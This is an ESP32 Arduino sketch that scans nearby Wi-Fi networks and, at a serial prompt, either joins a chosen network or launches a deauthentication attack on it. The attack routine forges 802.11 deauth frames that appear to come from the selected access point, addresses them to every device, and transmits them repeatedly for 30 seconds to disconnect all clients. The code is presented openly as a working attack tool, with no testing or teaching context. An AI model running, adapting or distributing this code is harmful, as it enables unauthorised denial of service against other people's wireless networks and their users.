#include "WiFi.h"
#include "esp_wifi.h"

#define ATTACK_DURATION 30  // Attack duration in seconds
bool attackRunning = false; // Track attack state

// Function to send deauth packets
void sendDeauth(uint8_t *targetMAC, uint8_t *apMAC) {
  uint8_t deauthPacket[26] = {
    0xc0, 0x00, 0x3a, 0x01,
    targetMAC[0], targetMAC[1], targetMAC[2], targetMAC[3], targetMAC[4], targetMAC[5], // Destination MAC
    apMAC[0], apMAC[1], apMAC[2], apMAC[3], apMAC[4], apMAC[5], // Source MAC (AP)
    apMAC[0], apMAC[1], apMAC[2], apMAC[3], apMAC[4], apMAC[5], // BSSID
    0x00, 0x00, 0x02, 0x00 // Reason code
  };

  for (int i = 0; i < 50; i++) { // Send 50 packets per loop
    if (!attackRunning) return; // Stop attack instantly if needed
    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), true);
    delay(1);
  }
}

// Function to scan available networks
void scanNetworks() {
  int n = WiFi.scanNetworks(); 
  Serial.println("\nNearby Wi-Fi Networks:");
  for (int i = 0; i < n; i++) {
    Serial.printf("[%d] SSID: %s | MAC: %s | Signal: %d dBm\n", 
      i, WiFi.SSID(i).c_str(), WiFi.BSSIDstr(i).c_str(), WiFi.RSSI(i));
  }
  Serial.println("\nEnter the number of the Wi-Fi network, then choose 'connect' or 'attack':");
}

// Function to connect to a network
void connectToNetwork(String ssid, String password) {
  WiFi.disconnect(); // Disconnect from any current network to avoid conflicts
  WiFi.begin(ssid.c_str(), password.c_str());
  Serial.print("Connecting to ");
  Serial.println(ssid);
  int attempts = 0;
  while (WiFi.status() != WL_CONNECTED && attempts < 20) { // Wait up to 10 seconds (20 * 500ms)
    delay(500);
    Serial.print(".");
    attempts++;
  }
  if (WiFi.status() == WL_CONNECTED) {
    Serial.println("\nConnected! IP: " + WiFi.localIP().toString());
  } else {
    Serial.println("\nFailed to connect. Check password or network availability.");
  }
}

// Deauth function
void attackNetwork(uint8_t *apMAC) {
  Serial.println("Launching Deauth Attack on all devices...");
  attackRunning = true;

  uint8_t broadcastMAC[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; // Target all devices
  long startTime = millis();

  while (millis() - startTime < ATTACK_DURATION * 1000) {
    if (!attackRunning) break; // Stop if requested
    sendDeauth(broadcastMAC, apMAC);
    Serial.println("Deauth packets sent!");
    delay(100);
  }

  Serial.println("Attack stopped!");
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_MODE_STA); // Set to station mode for scanning and connecting

  Serial.println("Scanning networks...");
  scanNetworks();
}

void loop() {
  if (Serial.available()) {
    String input = Serial.readStringUntil('\n');
    input.trim(); // Remove any trailing whitespace

    if (input == "stop") {
      attackRunning = false;
      Serial.println("Attack manually stopped.");
      return;
    }

    // Check if input is a number (network selection)
    int selectedNetwork = input.toInt();
    if (selectedNetwork >= 0 && selectedNetwork < WiFi.scanNetworks()) {
      String ssid = WiFi.SSID(selectedNetwork);
      uint8_t apMAC[6];
      sscanf(WiFi.BSSIDstr(selectedNetwork).c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
        &apMAC[0], &apMAC[1], &apMAC[2], &apMAC[3], &apMAC[4], &apMAC[5]);

      Serial.printf("Selected: %s (%s)\n", ssid.c_str(), WiFi.BSSIDstr(selectedNetwork).c_str());
      Serial.println("Type 'connect' to join the network or 'attack' to launch deauth:");

      // Wait for next input (connect or attack)
      while (!Serial.available()) { delay(100); }
      String action = Serial.readStringUntil('\n');
      action.trim();

      if (action == "connect") {
        Serial.println("Enter the password for this network:");
        while (!Serial.available()) { delay(100); }
        String password = Serial.readStringUntil('\n');
        password.trim();
        connectToNetwork(ssid, password);
      } else if (action == "attack") {
        attackNetwork(apMAC);
      } else {
        Serial.println("Invalid action. Type 'connect' or 'attack'.");
      }
    } else {
      Serial.println("Invalid selection. Enter a valid network number.");
    }
  }
}
